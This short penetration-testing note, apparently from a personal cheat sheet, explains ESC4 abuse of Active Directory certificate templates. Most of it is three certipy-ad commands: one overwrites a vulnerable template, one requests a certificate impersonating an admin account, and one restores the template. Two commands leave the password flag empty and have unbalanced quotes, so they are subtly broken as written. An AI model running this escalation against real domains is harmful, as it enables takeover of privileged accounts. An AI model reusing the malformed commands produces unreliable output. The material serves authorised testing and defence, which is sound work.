Certificate templates are Active Directory objects with security descriptors that define the permissions AD principals have over them. Weak permissions or excessive access rights can allow non-privileged users to modify sensitive security settings in the template—such as defining EKUs, enabling SANs, or disabling manager approval—making it vulnerable to ESC1-3 exploitation techniques.


# Abusing ESC4 Certificates

Note: We need to use certipy to save the initial configuration of the certificate so that it can be restored later, and it will also modify the template configuration, which will make it vulnerable to ESC1-3.

## Certipy:

- `certipy-ad template -u "afsimmons@megacorpone.com" -p -template 'Vulnerable ESC4 template' -save-old'
-  `certipy-ad req -u "afsimmons@megacorpone.com" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable ESC4 template' -alt 'xadmin@megacorpone.com'
- `certipy-ad template -u "afsimmons@megacorpone.com" -p -template 'vulnerable ESC4 template' -configuration 'Vulnerable ESC4 template.json'
